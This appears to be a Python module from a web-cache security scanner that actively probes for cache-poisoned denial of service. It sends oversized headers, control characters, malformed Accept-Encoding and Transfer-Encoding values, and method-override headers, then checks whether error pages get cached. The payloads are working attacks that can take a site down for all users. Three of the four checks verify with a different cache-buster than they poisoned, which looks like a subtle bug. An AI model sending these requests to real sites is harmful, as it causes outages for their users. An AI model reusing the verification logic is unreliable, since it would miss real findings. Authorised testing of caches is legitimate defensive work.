"""
Cache Poisoned Denial of Service (CPDoS) Active Detection Module

Implements active CPDoS detection by sending malformed/oversized requests
and checking if error responses get cached, causing persistent DoS for all users.

Techniques:
- HHO (Header OverflowOversize): Oversized header values exceed server buffer limits
- HMC (Header Meta Character): Control chars in header values trigger server rejection
- HCO (HTTP Coding): Malformed Accept-Encoding / Transfer-Encoding values
- Method Override DoS: Forbidden methods (CONNECT, TRACE) via override headers

References:
- https://cpdos.org/
- https://portswigger.net/research/practical-web-cache-poisoning
"""

import time
import uuid
import random
import asyncio
from typing import Dict, List, Optional

from cpd.http_client import HttpClient
from cpd.logic.baseline import Baseline
from cpd.logic.cache_guard import CacheGuard
from cpd.utils.logger import logger


class CpDoSDetector:
    """
    Active CPDoS (Cache Poisoned Denial of Service) detection.

    Tests whether malformed/oversized request headers trigger error responses
    that get cached and served to subsequent users, causing persistent DoS.
    """

    def __init__(self, baseline: Baseline, safe_headers: Dict[str, str] = None):
        self.baseline = baseline
        self.safe_headers = safe_headers or {}
        self.payload_id = str(uuid.uuid4())[:8]

    async def run(self, client: HttpClient) -> List[Dict]:
        """Execute all CPDoS detection techniques."""
        findings = []

        techniques = [
            self._hho_attack,
            self._hmc_attack,
            self._hco_attack,
            self._method_dos,
        ]

        tasks = [asyncio.create_task(t(client)) for t in techniques]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                logger.debug(f"CPDoS technique failed: {result}")
            elif result:
                if isinstance(result, list):
                    findings.extend(result)
                elif isinstance(result, dict):
                    findings.append(result)

        return findings

    async def _hho_attack(self, client: HttpClient) -> List[Dict]:
        """
        HTTP Header OverflowOversize (HHO) Attack

        Sends headers with values exceeding common server buffer sizes, triggering
        400/413/431 error responses. If the cache stores these errors, all subsequent
        users receive the error page (persistent DoS).
        """
        findings = []

        oversize_tests = [
            ("HHO-X-Forwarded-Host", "X-Forwarded-Host", "A" * 4097),
            ("HHO-User-Agent", "User-Agent", "M" * 8193),
            ("HHO-X-Custom-Large", "X-Oversized-Header", "B" * 16385),
            ("HHO-Accept", "Accept", "text/html," + ("text/plain," * 500)),
            ("HHO-Cookie", "Cookie", "sess=" + "x" * 4096),
        ]

        for name, header, value in oversize_tests:
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = self._add_cb(self.baseline.url, cache_buster)

            headers = {**self.safe_headers, header: value}

            try:
                poison_resp = await client.request("GET", target_url, headers=headers)
            except Exception:
                continue

            if not poison_resp:
                continue

            if poison_resp["status"] in [400, 413, 414, 431]:
                verify_cb = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
                verify_url = self._add_cb(self.baseline.url, verify_cb)

                verify_resp = await client.request("GET", verify_url, headers=self.safe_headers)

                if not verify_resp:
                    continue

                if verify_resp["status"] in [400, 413, 414, 431]:
                    is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                    if is_hit:
                        findings.append(self._make_finding(
                            "CPDoS-HHO",
                            "HIGH",
                            f"Oversized {header} ({len(value)} bytes) triggered cached "
                            f"{poison_resp['status']} error. All users may receive the error page.",
                            {"name": name, "header": header, "value": value[:50] + "...[truncated]"},
                            target_url,
                            verify_url=verify_url,
                            cached_status=poison_resp["status"],
                            cache_evidence=evidence,
                        ))

        return findings

    async def _hmc_attack(self, client: HttpClient) -> List[Dict]:
        """
        HTTP Meta Character (HMC) Attack

        Injects ASCII control characters into header values. Strict HTTP parsers
        reject these as malformed, returning 400 errors. If cached, causes DoS.

        Characters tested: BEL (\\x07), NULL (\\x00), DEL (\\x7f), ESC (\\x1b)
        """
        findings = []

        meta_char_tests = [
            ("HMC-BEL-Accept-Encoding", "Accept-Encoding", "gzip\x07deflate"),
            ("HMC-NULL-Accept-Encoding", "Accept-Encoding", "gzip\x00deflate"),
            ("HMC-DEL-Accept-Encoding", "Accept-Encoding", "gzip\x7fdeflate"),
            ("HMC-ESC-Accept-Language", "Accept-Language", "en\x1b-US"),
            ("HMC-NULL-X-Forwarded-For", "X-Forwarded-For", "127.0.0.1\x00"),
            ("HMC-BEL-Via", "Via", f"1.1 cache\x07{self.payload_id}"),
        ]

        for name, header, value in meta_char_tests:
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = self._add_cb(self.baseline.url, cache_buster)

            headers = {**self.safe_headers, header: value}

            try:
                poison_resp = await client.request("GET", target_url, headers=headers)
            except Exception:
                continue

            if not poison_resp:
                continue

            if poison_resp["status"] in [400, 403, 500]:
                verify_cb = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
                verify_url = self._add_cb(self.baseline.url, verify_cb)

                verify_resp = await client.request("GET", verify_url, headers=self.safe_headers)

                if not verify_resp:
                    continue

                if verify_resp["status"] in [400, 403, 500]:
                    is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                    if is_hit:
                        findings.append(self._make_finding(
                            "CPDoS-HMC",
                            "HIGH",
                            f"Control character in {header} (repr: {repr(value[:20])}) triggered "
                            f"cached {poison_resp['status']} error response.",
                            {"name": name, "header": header, "value": repr(value)},
                            target_url,
                            verify_url=verify_url,
                            cached_status=poison_resp["status"],
                            cache_evidence=evidence,
                        ))

        return findings

    async def _hco_attack(self, client: HttpClient) -> List[Dict]:
        """
        HTTP Coding (Accept-Encoding) Attack

        Sends syntactically malformed Accept-Encoding or Transfer-Encoding values.
        RFC-strict backends return 400/406 errors; if cached, causes DoS.
        """
        findings = []

        coding_tests = [
            ("HCO-Invalid-Encoding", "Accept-Encoding", f"not_a_real_encoding_{self.payload_id}"),
            ("HCO-Malformed-Q", "Accept-Encoding", "gzip;q=not_a_number"),
            ("HCO-Duplicate-Chunked", "Transfer-Encoding", "chunked, chunked"),
            ("HCO-Contradictory-TE", "Transfer-Encoding", "identity;q=0"),
            ("HCO-Large-Q-Factor", "Accept-Encoding", "gzip;q=1.1"),
        ]

        for name, header, value in coding_tests:
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = self._add_cb(self.baseline.url, cache_buster)

            headers = {**self.safe_headers, header: value}

            try:
                poison_resp = await client.request("GET", target_url, headers=headers)
            except Exception:
                continue

            if not poison_resp:
                continue

            if poison_resp["status"] in [400, 406, 501]:
                verify_cb = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
                verify_url = self._add_cb(self.baseline.url, verify_cb)

                verify_resp = await client.request("GET", verify_url, headers=self.safe_headers)

                if not verify_resp:
                    continue

                if verify_resp["status"] in [400, 406, 501]:
                    is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                    if is_hit:
                        findings.append(self._make_finding(
                            "CPDoS-HCO",
                            "MEDIUM",
                            f"Malformed {header} value '{value}' triggered cached "
                            f"{poison_resp['status']} error.",
                            {"name": name, "header": header, "value": value},
                            target_url,
                            verify_url=verify_url,
                            cached_status=poison_resp["status"],
                            cache_evidence=evidence,
                        ))

        return findings

    async def _method_dos(self, client: HttpClient) -> List[Dict]:
        """
        HTTP Method Override DoS

        Uses X-HTTP-Method-Override with dangerous/forbidden methods (CONNECT, TRACE,
        TRACK) that most servers reject with 405/501. If the rejection is cached,
        all users receive the error response (DoS).
        """
        findings = []

        dos_methods = [
            ("CPDoS-CONNECT", "CONNECT"),
            ("CPDoS-TRACE", "TRACE"),
            ("CPDoS-TRACK", "TRACK"),
            ("CPDoS-ARBITRARY", f"EVIL_{self.payload_id}"),
        ]

        for name, method_value in dos_methods:
            cache_buster = f"cb={int(time.time())}_{random.randint(1000, 9999)}"
            target_url = self._add_cb(self.baseline.url, cache_buster)

            headers = {
                **self.safe_headers,
                "X-HTTP-Method-Override": method_value,
            }

            try:
                poison_resp = await client.request("GET", target_url, headers=headers)
            except Exception:
                continue

            if not poison_resp:
                continue

            if poison_resp["status"] in [400, 405, 501]:
                verify_resp = await client.request("GET", target_url, headers=self.safe_headers)

                if not verify_resp:
                    continue

                if verify_resp["status"] in [400, 405, 501]:
                    is_hit, evidence = CacheGuard.cache_hit_signal(verify_resp)
                    if is_hit:
                        findings.append(self._make_finding(
                            "CPDoS-MethodOverride",
                            "HIGH",
                            f"X-HTTP-Method-Override: {method_value} triggered cached "
                            f"{poison_resp['status']} error. Cache serves error to all users.",
                            {"name": name, "header": "X-HTTP-Method-Override", "value": method_value},
                            target_url,
                            verify_url=target_url,
                            cached_status=poison_resp["status"],
                            cache_evidence=evidence,
                        ))

        return findings

    def _add_cb(self, url: str, cb: str) -> str:
        """Add cache buster parameter to URL."""
        return f"{url}?{cb}" if "?" not in url else f"{url}&{cb}"

    def _make_finding(self, vuln_type: str, severity: str, details: str,
                      signature: Dict, target_url: str, **kwargs) -> Dict:
        """Create a CPDoS finding dict."""
        return {
            "vulnerability": vuln_type,
            "severity": severity,
            "details": details,
            "signature": signature,
            "url": self.baseline.url,
            "target_url": target_url,
            "payload_id": self.payload_id,
            "technique_type": "cpd_dos",
            **kwargs,
        }
